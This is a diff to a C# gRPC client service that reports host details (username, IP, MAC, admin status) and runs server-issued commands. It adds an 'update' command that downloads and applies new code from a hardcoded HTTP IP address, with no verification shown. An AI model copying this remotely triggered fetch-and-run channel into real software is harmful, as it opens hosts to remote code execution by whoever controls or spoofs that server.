@@ -123,7 +123,7 @@ public class GrpcClientService : BackgroundService
             CpuCount = Environment.ProcessorCount,
             TotalMemoryBytes = GC.GetGCMemoryInfo().TotalAvailableMemoryBytes,
             Username = Environment.UserName,
-            ClientVersion = "1.0.0",
+            ClientVersion = GetClientVersion(),
             IpAddress = GetLocalIpAddress(),
             MacAddress = GetPrimaryMacAddress(),
             IsAdmin = IsRunningAsAdmin()
@@ -255,6 +255,10 @@ public class GrpcClientService : BackgroundService
 
                 case "signout":
                     result = ExecutePowerCommand(command, "/l");
+                    break;
+
+                case "update":
+                    result = await HandleUpdateCommandAsync(command, ct);
                     break;
 
                 default:
@@ -524,6 +528,59 @@ public class GrpcClientService : BackgroundService
         catch
         {
             return false;
+        }
+    }
+
+    private static string GetClientVersion()
+    {
+        var assembly = System.Reflection.Assembly.GetExecutingAssembly();
+        var attribute = assembly.GetCustomAttributes(typeof(System.Reflection.AssemblyInformationalVersionAttribute), false)
+            .FirstOrDefault() as System.Reflection.AssemblyInformationalVersionAttribute;
+        return attribute?.InformationalVersion ?? "0.0.0";
+    }
+
+    private async Task<CommandResult> HandleUpdateCommandAsync(Command command, CancellationToken ct)
+    {
+        var result = new CommandResult { CommandId = command.CommandId };
+
+        try
+        {
+            _logger.LogInformation("Update command received. Checking for updates...");
+
+            var serverApiUrl = _configuration["Server:ApiAddress"] ?? "http://144.91.111.101:5001";
+            var updateService = new UpdateService(_logger, serverApiUrl);
+
+            // Check for updates
+            var latestVersion = await updateService.CheckForUpdateAsync();
+
+            if (latestVersion == null)
+            {
+                result.Success = true;
+                result.Stdout = $"No update available. Current version: {updateService.CurrentVersion}";
+                _logger.LogInformation("No update available");
+                return result;
+            }
+
+            // Apply update
+            result.Stdout = $"Update available: {latestVersion.Version}. Downloading and applying...";
+            _logger.LogInformation("Applying update to version {Version}", latestVersion.Version);
+
+            // Send result before applying (as we'll exit)
+            await SendCommandResultAsync(result, ct);
+
+            // This will exit the process
+            await updateService.ApplyUpdateAsync(latestVersion);
+
+            // Should never reach here
+            result.Success = true;
+            return result;
+        }
+        catch (Exception ex)
+        {
+            result.Success = false;
+            result.ErrorMessage = $"Update failed: {ex.Message}";
+            _logger.LogError(ex, "Update command failed");
+            return result;
         }
     }
 }
